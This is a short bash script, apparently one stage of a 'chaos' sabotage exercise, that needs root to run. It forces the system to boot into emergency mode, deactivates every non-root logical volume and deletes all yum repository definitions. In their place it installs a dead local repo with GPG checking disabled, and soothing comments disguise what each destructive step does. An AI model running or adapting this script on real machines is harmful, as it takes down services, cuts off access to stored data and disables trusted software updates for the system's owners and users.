#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Error: High-privilege access required. Execute with sudo." >&2
  exit 1
fi

# 1. Force state machine initialization into target isolate loop
systemctl set-default emergency.target 2>/dev/null

# 2. Map and drop active logical disk groups safely but aggressively
LV_TARGETS=$(lvs --noheadings -o lv_path | tr -d ' ')
for lv in $LV_TARGETS; do
    # Skip tearing down core operating system root volumes to prevent script panic mid-run
    if [[ "$lv" != *"root"* ]]; then
        lvchange -an "$lv" 2>/dev/null
    fi
done

# 3. Wipe and trap localized packaging mirrors
rm -rf /etc/yum.repos.d/*
echo -e "[chaos-blackout]\nname=Chaos Blackout\nbaseurl=http://127.0.0.1/null\nenabled=1\ngpgcheck=0" > /etc/yum.repos.d/chaos.repo

echo "[+] Level 10 complete. Full storage volume, target state, and repository blackout applied."